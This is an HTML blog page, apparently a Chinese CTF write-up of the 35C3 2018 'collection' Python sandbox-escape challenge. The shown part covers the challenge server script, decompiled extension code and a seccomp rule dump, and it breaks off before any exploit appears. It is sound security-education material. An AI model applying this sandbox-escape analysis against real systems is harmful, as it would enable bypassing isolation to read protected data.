@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="35c3 Python escape">
+<meta property="og:type" content="article">
+<meta property="og:title" content="35C3 CTF 2018 - collection (pwn)">
+<meta property="og:url" content="https://bestwing.me/2018-353cCTF-2018-collection-pwn.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="35c3 Python escape">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190101151855.png">
+<meta property="article:published_time" content="2018-12-31T16:58:22.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:28:44.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="35c3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190101151855.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>35C3 CTF 2018 - collection (pwn)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/The-past-year-the-new-year.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/Docker-for-Mac-and-run-gdb-GUI-window.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&text=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&is_video=false&description=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=35C3 CTF 2018 - collection (pwn)&body=Check out this article: https://bestwing.me/2018-353cCTF-2018-collection-pwn.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&name=35C3 CTF 2018 - collection (pwn)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&t=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9-Collection-%E9%80%86%E5%90%91"><span class="toc-number">3.</span> <span class="toc-text">对 Collection 逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vul"><span class="toc-number">4.</span> <span class="toc-text">Vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        35C3 CTF 2018 - collection (pwn)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-12-31T16:58:22.000Z" itemprop="datePublished">2019-01-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/35c3/" rel="tag">35c3</a>, <a class="tag-link-link" href="/tags/Python/" rel="tag">Python</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><a href="https://35c3ctf.ccc.ac/uploads/52ae03f0ae030a74a2bd466852308cba74c0f313.tar.gz">behold my collection</a></p>
+<p>The container is built with the following important statements</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line">RUN apt-get -y install python3.6</span><br><span class="line">COPY build&#x2F;lib.linux-x86_64-3.6&#x2F;Collection.cpython-36m-x86_64-linux-gnu.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.6&#x2F;dist-packages&#x2F;Collection.cpython-36m-x86_64-linux-gnu.so</span><br></pre></td></tr></table></figure>
+
+<p>Copy the library in the same destination path and check that it works with</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.6 test.py</span><br></pre></td></tr></table></figure>
+
+<p>Challenge runs at 35.207.157.79:4444</p>
+<p>Difficulty: easy</p>
+<h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>题目给了python3.6 和 Collection.cpython-36m-x86_64-linux-gnu.so 这两个比较有用的文件。其中从命名我们可以得知 Collection.cpython-36m-x86_64-linux-gnu.so 是C语言写的一个Python库。</p>
+<p>在 Server.py 文件里，我们可以得知这是一个 Python escape题。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from sys import modules</span></span><br><span class="line"><span class="string">del modules[&#x27;os&#x27;]</span></span><br><span class="line"><span class="string">import Collection</span></span><br><span class="line"><span class="string">keys = list(__builtins__.__dict__.keys())</span></span><br><span class="line"><span class="string">for k in keys:</span></span><br><span class="line"><span class="string">    if k != &#x27;id&#x27; and k != &#x27;hex&#x27; and k != &#x27;print&#x27; and k != &#x27;range&#x27;:</span></span><br><span class="line"><span class="string">        del __builtins__.__dict__[k]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size_max = <span class="number">20000</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;enter your code, enter the string END_OF_PWN on a single line to finish&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = prefix</span><br><span class="line">new = <span class="string">&quot;&quot;</span></span><br><span class="line">finished = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> size_max &gt; len(code):</span><br><span class="line">    new = raw_input(<span class="string">&quot;code&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> new == <span class="string">&quot;END_OF_PWN&quot;</span>:</span><br><span class="line">        finished = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    code += new + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> finished:</span><br><span class="line">    print(<span class="string">&quot;max length exceeded&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&quot;/tmp/%s&quot;</span> % randstr()</span><br><span class="line"><span class="keyword">with</span> open(file_name, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.dup2(flag.fileno(), <span class="number">1023</span>)</span><br><span class="line">flag.close()</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;python3.6 -u %s&quot;</span> % file_name</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>从关键的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">prefix = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from sys import modules</span></span><br><span class="line"><span class="string">del modules[&#x27;os&#x27;]</span></span><br><span class="line"><span class="string">import Collection</span></span><br><span class="line"><span class="string">keys = list(__builtins__.__dict__.keys())</span></span><br><span class="line"><span class="string">for k in keys:</span></span><br><span class="line"><span class="string">    if k != &#x27;id&#x27; and k != &#x27;hex&#x27; and k != &#x27;print&#x27; and k != &#x27;range&#x27;:</span></span><br><span class="line"><span class="string">        del __builtins__.__dict__[k]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以得知，这他删掉了 os 模块，只留下了 id ,hex ,print ,range。我们第一思路就是，突破口在 </p>
+<p>Collection.cpython-36m-x86_64-linux-gnu.so 这个扩展库里。于是我们先去逆向这个文件</p>
+<h2 id="对-Collection-逆向"><a href="#对-Collection-逆向" class="headerlink" title="对 Collection 逆向"></a>对 Collection 逆向</h2><p>我们可以清晰的看到这个文件保留了符号：</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190101151855.png"></p>
+<p>由于是用来作为Python扩展库，方便用来直接 import 所以保留符号应该是其一个原因之一。由于以前没有用C写过Python的扩展库。所以了解了一下：</p>
+<p><a href="https://docs.python.org/3/extending/building.html#building-c-and-c-extensions">Building C and C++ Extensions</a></p>
+<p>从中我们大概可以得知的是 PyInit_Collection初始化<code>Collection</code>将要实现的此类型的自定义类型。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">int64 <span class="title">PyInit_Collection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)PyType_Ready(&amp;qword_2041E0) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v0 = PyModule_Create2(&amp;unk_204120, <span class="number">1013L</span>L);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++qword_2041E0;</span><br><span class="line">    PyModule_AddObject(v0, <span class="string">&quot;Collection&quot;</span>, &amp;qword_2041E0);</span><br><span class="line">    mprotect((<span class="keyword">void</span> *)<span class="number">0x439000</span>, <span class="number">1u</span>LL, <span class="number">7</span>);</span><br><span class="line">    MEMORY[<span class="number">0x43968F</span>] = _mm_load_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_27E0);</span><br><span class="line">    MEMORY[<span class="number">0x43969F</span>] = MEMORY[<span class="number">0x43968F</span>];</span><br><span class="line">    mprotect((<span class="keyword">void</span> *)<span class="number">0x439000</span>, <span class="number">1u</span>LL, <span class="number">5</span>);</span><br><span class="line">    init_sandbox();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在这个过程中，我们发现其在 seccomp 函数中做了一些 seccomp：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF  	K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  <span class="keyword">if</span> (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x000000e7  <span class="keyword">if</span> (A != exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000000c  <span class="keyword">if</span> (A != brk) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000009  <span class="keyword">if</span> (A != mmap) goto 0012</span><br><span class="line"> 0011: 0x05 0x00 0x00 0x00000011  goto 0029</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x0000000b  <span class="keyword">if</span> (A != munmap) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000019  <span class="keyword">if</span> (A != mremap) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x00000013  <span class="keyword">if</span> (A != readv) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x000000ca  <span class="keyword">if</span> (A != futex) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0020: 0x15 0x00 0x01 0x00000083  <span class="keyword">if</span> (A != sigaltstack) goto 0022</span><br><span class="line"> 0021: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x00000003  <span class="keyword">if</span> (A != close) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0024: 0x15 0x00 0x01 0x00000001  <span class="keyword">if</span> (A != write) goto 0026</span><br><span class="line"> 0025: 0x05 0x00 0x00 0x00000037  goto 0081</span><br><span class="line"> 0026: 0x15 0x00 0x01 0x0000000d  <span class="keyword">if</span> (A != rt_sigaction) goto 0028</span><br><span class="line"> 0027: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0028: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0029: 0x05 0x00 0x00 0x00000000  goto 0030</span><br><span class="line"> 0030: 0x20 0x00 0x00 0x00000010  A = args[0]</span><br><span class="line"> 0031: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0032: 0x20 0x00 0x00 0x00000014  A = args[0] &gt;&gt; 32</span><br><span class="line"> 0033: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0034: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0038</span><br><span class="line"> 0035: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0036: 0x15 0x02 0x00 0x00000000  <span class="keyword">if</span> (A == 0x0) goto 0039</span><br><span class="line"> 0037: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0038: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0039: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0040: 0x20 0x00 0x00 0x00000020  A = args[2]</span><br><span class="line"> 0041: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0042: 0x20 0x00 0x00 0x00000024  A = args[2] &gt;&gt; 32</span><br><span class="line"> 0043: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0044: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0048</span><br><span class="line"> 0045: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0046: 0x15 0x02 0x00 0x00000003  <span class="keyword">if</span> (A == 0x3) goto 0049</span><br><span class="line"> 0047: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0048: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0049: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0050: 0x20 0x00 0x00 0x00000028  A = args[3]</span><br><span class="line"> 0051: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0052: 0x20 0x00 0x00 0x0000002c  A = args[3] &gt;&gt; 32</span><br><span class="line"> 0053: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0054: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0058</span><br><span class="line"> 0055: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0056: 0x15 0x02 0x00 0x00000022  <span class="keyword">if</span> (A == 0x22) goto 0059</span><br><span class="line"> 0057: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0058: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0059: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0060: 0x20 0x00 0x00 0x00000030  A = args[4]</span><br><span class="line"> 0061: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0062: 0x20 0x00 0x00 0x00000034  A = args[4] &gt;&gt; 32</span><br><span class="line"> 0063: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0064: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0068</span><br><span class="line"> 0065: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0066: 0x15 0x02 0x00 0xffffffff  <span class="keyword">if</span> (A == 0xffffffff) goto 0069</span><br><span class="line"> 0067: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0068: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0069: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0070: 0x20 0x00 0x00 0x00000038  A = args[5]</span><br><span class="line"> 0071: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0072: 0x20 0x00 0x00 0x0000003c  A = args[5] &gt;&gt; 32</span><br><span class="line"> 0073: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0074: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0078</span><br><span class="line"> 0075: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0076: 0x15 0x02 0x00 0x00000000  <span class="keyword">if</span> (A == 0x0) goto 0079</span><br><span class="line"> 0077: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0078: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0079: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0080: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0081: 0x05 0x00 0x00 0x00000000  goto 0082</span><br><span class="line"> 0082: 0x20 0x00 0x00 0x00000010  A = args[0]</span><br><span class="line"> 0083: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br><span class="line"> 0084: 0x20 0x00 0x00 0x00000014  A = args[0] &gt;&gt; 32</span><br><span class="line"> 0085: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br><span class="line"> 0086: 0x15 0x00 0x05 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0092</span><br><span class="line"> 0087: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0088: 0x15 0x00 0x02 0x00000001  <span class="keyword">if</span> (A != 0x1) goto 0091</span><br><span class="line"> 0089: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0090: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 